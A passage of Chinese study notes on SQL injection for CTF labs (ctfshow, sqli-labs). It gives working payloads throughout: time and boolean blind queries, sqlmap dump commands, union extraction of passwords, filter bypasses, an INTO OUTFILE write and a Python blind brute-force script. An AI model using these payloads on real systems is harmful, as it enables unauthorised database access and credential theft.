operator">+</span></pre></td></tr></table></figure><p>猜解具体数据</p>
<figure class="highlight applescript"><figcaption data-lang="applescript"></figcaption><table><tr><td data-num="1"></td><td><pre>?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span>select 字段名 <span class="token keyword">from</span> 表名 limit <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">102</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">--+</span></pre></td></tr></table></figure><p>URL 编码后：</p>
<figure class="highlight perl"><figcaption data-lang="perl"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span><span class="token variable">%27</span><span class="token variable">%20</span><span class="token operator">and</span><span class="token variable">%20</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span>select<span class="token variable">%20</span>password<span class="token variable">%20</span>from<span class="token variable">%20</span>users<span class="token variable">%20</span>limit<span class="token variable">%200</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">102</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="2"></td><td><pre>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token variable">%20</span><span class="token operator">--</span><span class="token operator">+</span></pre></td></tr></table></figure><h3 id="7使用工具进行注入"><a class="anchor" href="#7使用工具进行注入">#</a> 7. 使用工具进行注入</h3>
<h4 id="1sqlmap"><a class="anchor" href="#1sqlmap">#</a> 1.sqlmap</h4>
<p>基础探测命令<br />
联合查询注入：</p>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">.</span>\sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://192.168.xxx.xxx/sqli/Less-1/?id=1"</span> <span class="token comment">--dbms=MySQL --technique=U -v 3</span></pre></td></tr></table></figure><p>报错注入：</p>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">.</span>\sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://192.168.xxx.xxx/sqli/Less-1/?id=1"</span> <span class="token comment">--dbms=MySQL --technique=E -v 3</span></pre></td></tr></table></figure><p>布尔盲注：</p>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">.</span>\sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://192.168.xxx.xxx/sqli/Less-1/?id=1"</span> <span class="token comment">--dbms=MySQL --technique=B -v 3</span></pre></td></tr></table></figure><p>时间盲注：</p>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">.</span>\sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://192.168.xxx.xxx/sqli/Less-1/?id=1"</span> <span class="token comment">--dbms=MySQL --technique=T -v 3</span></pre></td></tr></table></figure><p>爆破数据<br />
 --current-db 当前使用的数据库<br />
 --dbs 列出数据库信息<br />
 - D 指定数据库，爆破指定数据库中的表<br />
 - D 数据库名 --tables<br />
-T 指定数据表名，爆破指定表中的字段<br />
 - D 库名 -T 表名 --columns<br />
-C 指定字段名，爆破具体数据<br />
 --dump 将数据导出、转储<br />
指定库、表、字段，查询具体数据</p>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">.</span>\sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://192.168.xxx.xxx/sqli/Less-1/?id=1"</span> <span class="token comment">--dbms=MySQL --technique=T -v 3 -D security -T users -C username,password --dump</span></pre></td></tr></table></figure><h2 id="联合查询union"><a class="anchor" href="#联合查询union">#</a> 联合查询 union</h2>
<p>将两个 sql 查询语句并到一起，例如下面</p>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">SELECT</span> emp_id 编号<span class="token punctuation">,</span> emp_name 姓名<span class="token punctuation">,</span> dept_id 所属部门或班级 <span class="token keyword">FROM</span> emp</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">UNION</span>   <span class="token comment">#若为 UNION ALL 则显示不去重的结果</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">SELECT</span> stu_id 编号<span class="token punctuation">,</span> stu_name 姓名<span class="token punctuation">,</span> class_id 所属部门或班级 <span class="token keyword">FROM</span> student</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">LIMIT</span> <span class="token number">15</span></pre></td></tr></table></figure><p><strong>注意：<strong>多条查询语句的</strong>查询列数</strong>必须保持一致（即 select 后的字段数要一致，这样显示的列数才能一样，才能并到一起），否则报错。</p>
<h2 id="order-by"><a class="anchor" href="#order-by">#</a> order by</h2>
<h3 id="1作用"><a class="anchor" href="#1作用">#</a> 1. 作用：</h3>
<p><code>ORDER BY 关键字</code> 可以使查询返回的「结果集」按照指定的列进行 <code>排序</code> 【默认是升序】</p>
<h3 id="2使用"><a class="anchor" href="#2使用">#</a> 2. 使用</h3>
<h4 id="1按字段名列名进行排序"><a class="anchor" href="#1按字段名列名进行排序">#</a> 1. 按字段名（列名）进行排序</h4>
<p>例如：</p>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">order</span> <span class="token keyword">by</span> username</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#按照 username 升序排序</span></pre></td></tr></table></figure><h4 id="2按列索引继续排序"><a class="anchor" href="#2按列索引继续排序">#</a> 2. 按列索引继续排序</h4>
<p>例如：</p>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#按照第一列的字段名进行排序，假如第一列是 username，</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#那么结果和 order by username 相同</span></pre></td></tr></table></figure><p><strong>可以通过这种方式判断有几个字段</strong>：</p>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">#正常</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">#正常</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token comment">#报错，则说明相应的数据库表只有两个字段</span></pre></td></tr></table></figure><h2 id="sql注入流程"><a class="anchor" href="#sql注入流程">#</a> sql 注入流程</h2>
<h3 id="1判断表有几列几行"><a class="anchor" href="#1判断表有几列几行">#</a> 1. 判断表有几列几行：</h3>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#判断列数 (字段数)：</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">#正常</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">#正常</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token comment">#报错，则说明相应的数据库表只有两个字段</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">#判断行数</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">select</span> id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password <span class="token keyword">from</span> security<span class="token punctuation">.</span>users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment">/* 这里 select 1，2，3; 如果有三个字段就显示三列，每个字段有几行就显示几行 */</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">select</span>直接加数字串不指向任何数据库的表，输入的数字是什么就返回什么</pre></td></tr></table></figure><h3 id="2获取表名"><a class="anchor" href="#2获取表名">#</a> 2. 获取表名：</h3>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#select 1,group_concat(table_name)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">--+</span></pre></td></tr></table></figure><ul>
<li><code>group_concat(table_name):</code>  将目标表的<strong>所有表名</strong>拼接成一行， <code>group_concat</code>  是一个聚合函数，用于将查询结果按行拼接为一个字符串，并用逗号分隔</li>
<li><code>information_schema.tables:</code> information_schema 是数据库中一个系统模式，包含关于数据库表结构的元信息，tables 是系统表，存储了数据库中所有表的表名及其相关信息</li>
<li><code>table_schema=database():</code> database () 函数返回当前使用的<strong>数据库名称</strong></li>
</ul>
<h3 id="3获取列名"><a class="anchor" href="#3获取列名">#</a> 3. 获取列名：</h3>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#列名 conumn_name，这里的表名 `ctfshow_user2` 是从上一步得到的</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">1</span><span class="token string">' union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='</span>ctfshow_user2'<span class="token comment">--+</span></pre></td></tr></table></figure><h3 id="4获取信息"><a class="anchor" href="#4获取信息">#</a> 4. 获取信息</h3>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#从上一步得到列名 id、username、password ，根据需要利用联合查询 union 获取相应信息</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> id<span class="token punctuation">,</span>password <span class="token keyword">from</span> ctfshow_user2<span class="token comment">--+</span></pre></td></tr></table></figure><p>回显限制绕过：</p>
<ol>
<li>
<p>返回值限制 (字符串匹配类型的限制)<strong> 不允许出现 flag</strong>:</p>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#利用 hex ()，转为 hex 格式输出</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> id<span class="token punctuation">,</span>hex<span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">,</span>password <span class="token keyword">from</span> ctfshow_user3 <span class="token comment">--+</span></pre></td></tr></table></figure></li>
<li>
<p>不允许出现数字：</p>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#把数字 [0-9] 换成大写字母，同时为了防止不允许出现 flag，所以把 g 替换成 K</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">1</span><span class="token string">' union select '</span>a<span class="token string">',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,'</span><span class="token number">1</span><span class="token string">','</span>A<span class="token string">'),'</span><span class="token number">2</span><span class="token string">','</span>B<span class="token string">'),'</span><span class="token number">3</span><span class="token string">','</span>C<span class="token string">'),'</span><span class="token number">4</span><span class="token string">','</span>D<span class="token string">'),'</span><span class="token number">5</span><span class="token string">','</span>E<span class="token string">'),'</span><span class="token number">6</span><span class="token string">','</span>F<span class="token string">'),'</span><span class="token number">7</span><span class="token string">','</span>G<span class="token string">'),'</span><span class="token number">8</span><span class="token string">','</span>H<span class="token string">'),'</span><span class="token number">9</span><span class="token string">','</span>I<span class="token string">'),'</span><span class="token number">0</span><span class="token string">','</span>J<span class="token string">'),'</span>g<span class="token string">','</span>K<span class="token string">') from ctfshow_user4 --+</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>#replace(string_expression , string_pattern , string_replacement)</pre></td></tr><tr><td data-num="5"></td><td><pre>#将字段(expression)中的原本字符串(pattern)转换为替换后的字符串(replacement)</pre></td></tr><tr><td data-num="6"></td><td><pre>#这里的replace嵌套是将password中已经将`1`换为`A`后的内容再做对`2`的替换，以此类推</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>##还原(在cmd中用python就行)：</pre></td></tr><tr><td data-num="9"></td><td><pre>text="ctfshow&#123;bABIHCeC-Bdea-DIdf-IcGa-CCbBFBDICdEd&#125;"</pre></td></tr><tr><td data-num="10"></td><td><pre>print(text.replace('</span>A<span class="token string">','</span><span class="token number">1</span><span class="token string">').replace('</span>B<span class="token string">','</span><span class="token number">2</span><span class="token string">').replace('</span>C<span class="token string">','</span><span class="token number">3</span><span class="token string">').replace('</span>D<span class="token string">','</span><span class="token number">4</span><span class="token string">').replace('</span>E<span class="token string">','</span><span class="token number">5</span><span class="token string">').replace('</span>F<span class="token string">','</span><span class="token number">6</span><span class="token string">').replace('</span>G<span class="token string">','</span><span class="token number">7</span><span class="token string">').replace('</span>H<span class="token string">','</span><span class="token number">8</span><span class="token string">').replace('</span>I<span class="token string">','</span><span class="token number">9</span><span class="token string">').replace('</span>J<span class="token string">','</span><span class="token number">0</span><span class="token string">').replace('</span>K<span class="token string">','</span>g<span class="token string">'))</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>#把数字换为特殊符号【可能有误】：</pre></td></tr><tr><td data-num="13"></td><td><pre>1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token string">'a'</span><span class="token punctuation">,</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'!'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'@'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'#'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'$'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'6'</span><span class="token punctuation">,</span><span class="token string">'^'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'7'</span><span class="token punctuation">,</span><span class="token string">'&amp;'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">,</span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'9'</span><span class="token punctuation">,</span><span class="token string">'['</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'g'</span><span class="token punctuation">,</span><span class="token string">'&#123;'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> ctfshow_user4 <span class="token comment">--+</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token comment">## 还原：</span></pre></td></tr><tr><td data-num="16"></td><td><pre>def replace_str<span class="token punctuation">(</span>s<span class="token punctuation">)</span>:</pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token string">'!'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token string">'@'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token string">'$'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token string">'%'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token string">'^'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">'8'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token string">'['</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token string">']'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token string">'&#123;'</span><span class="token punctuation">,</span><span class="token string">'g'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>flag<span class="token operator">=</span><span class="token string">'ctfshow&#123;fc&amp;(*#^*-ab$d-$!%(-a!f!-*#(&amp;*c*e!*(@&#125;'</span></pre></td></tr><tr><td data-num="20"></td><td><pre>replace_str<span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr></table></figure></li>
<li>
<p>过滤了所有的 ascii 字符 <code>(preg_match('/[\x00-\x7f]/i)</code></p>
</li>
</ol>
<ul>
<li>
<p><strong>利用 into outfile 语句</strong></p>
<p>作用：导出数据到 pc 的指定目录下</p>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">SELECT</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">'file_name'</span> <span class="token comment">/*file_name 是路径及文件名 */</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#例如：</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span>  username<span class="token punctuation">,</span>password <span class="token keyword">from</span> ctfshow_user5 <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">"/var/www/html/1.txt"</span><span class="token comment">--+</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">/*into outfile "/var/www/html/1.txt" 将查询结果写入到位于网页根目录下的名为 1.txt 的文件中 */</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#（路径 /var/www/html/ 是一个常见的用于存放网页文件的目录，通常被称为网页根目录。在许多 Web 服务器中，这个目录被设置为存放网站的主要文件，因此可以通过浏览器访问。）</span></pre></td></tr></table></figure></li>
<li>
<p>时间盲注</p>
</li>
</ul>
<h2 id="判断过滤"><a class="anchor" href="#判断过滤">#</a> 判断过滤</h2>
<p>** 注意：** 可能 <code>--+</code>  不能成功（猜测 <code>+</code>  是被当作了空格被过滤的情况），可以用 <code>%23</code>  (#) 来注释</p>
<h3 id="1判断闭合"><a class="anchor" href="#1判断闭合">#</a> 1. 判断闭合</h3>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">1</span><span class="token string">'  #'</span><span class="token comment">#若报错，则是单引号闭合，因为后面会一个单引号没有被闭合上</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">1</span><span class="token string">"  #"</span><span class="token comment">#若报错，则是双引号闭合</span></pre></td></tr></table></figure><h3 id="2判断过滤空格"><a class="anchor" href="#2判断过滤空格">#</a> 2. 判断过滤空格</h3>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">1</span><span class="token string">' and '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span> <span class="token comment">#不能正常显示应该是有过滤。</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">1</span><span class="token string">'||'</span><span class="token number">1</span>    <span class="token comment">#若可以正常显示，那么应该是过滤了空格或者 and （因为上面只有空格和 and 不一致）</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">1</span><span class="token string">'and'</span><span class="token number">1</span>   <span class="token comment">#没有问题，则就是过滤了空格</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#用 /**/ 绕过空格过滤（/**/ 替换空格）</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">#用空格 url 编码替换 %0d%0a</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment">#换行符 %0b 代替空格</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment">#用 %09 代替</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token comment">#用 %0c 代替空格</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment">#不需要空格的万能密码：'or'1'='1'%23</span></pre></td></tr></table></figure><h3 id="3绕过过滤注释符"><a class="anchor" href="#3绕过过滤注释符">#</a> 3. 绕过过滤注释符</h3>
<figure class="highlight sql"><figcaption data-lang="SQL"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#在 union select 中嵌套一个 select</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'3</pre></td></tr><tr><td data-num="3"></td><td><pre>union select 1, (select password from ctfshow_user where username='</span>flag<span class="token string">' ),'</span><span class="token number">3</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#这里嵌套的 select 是新的语句，不受 limit 1 的影响，但是会被外层语句正确执行的结果覆盖，所以要外层为假</span></pre></td></tr></table></figure><h3 id="4布尔盲注"><a class="anchor" href="#4布尔盲注">#</a> 4. 布尔盲注</h3>
<p>根据返回结果判断输入的字符是不是 flag 的部分内容，可由此对字母和数字进行逐个判断，最后逐个得到 flag 的所有内容：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> time</pre></td></tr><tr><td data-num="3"></td><td><pre>url<span class="token operator">=</span><span class="token string">"http://66c49936-7450-4479-8ad7-4795efd64951.challenge.ctf.show/select-waf.php"</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>flagstr<span class="token operator">=</span><span class="token string">"qwertyuiop&#123;&#125;|asdfghjklzxcvbnm&lt;>/1234567890-=!@#$%^&amp;*()_+.`~"</span></pre></td></tr><tr><td data-num="6"></td><td><pre>flag<span class="token operator">=</span><span class="token string">""</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">for</span> x <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        data<span class="token operator">=</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>            <span class="token string">"tableName"</span><span class="token punctuation">:</span><span class="token string">"`ctfshow_user`where`pass`regexp(\"ctfshow&#123;&#125;\")"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>flag<span class="token operator">+</span>x<span class="token punctuation">)</span> <span class="token comment">#`\` 是转义符，最后视作 `regexp ("ctfshow &#123;&#125;")`,regexp 是正则匹配能够匹配上，使回显得到 count=1 (匹配上了 flag) 那就是 flag 的内容</span></pre></td></tr><tr><td data-num="11"></td><td><pre>                                                                                        <span class="token comment">#遍历 flagstr 将其放入 `ctfshow` 后，替换掉 &#123;&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>            <span class="token comment">#"tableName":"`ctfshow_user`where`pass`like\'ctfshow &#123;&#125;%\'".format (flag+x)  #相当于`ctfshow%` 搜索与之匹配的</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        response<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token comment">#有并发数量限制的题目，就睡一段时间</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token comment">#time.sleep (0.01) #原本 0.3</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"$user_count = 1;"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"++++++++++++++++ &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>            flag<span class="token operator">+=</span>x</pre></td></tr><tr><td data-num="21"></td><td><pre>            <span class="token keyword">break</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre>            <span class="token keyword">continue</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ctfshow"</span><span class="token operator">+</span>flag<span class="token punctuation">)</span></pre></td></tr></table></figure><ol start="2">
<li>
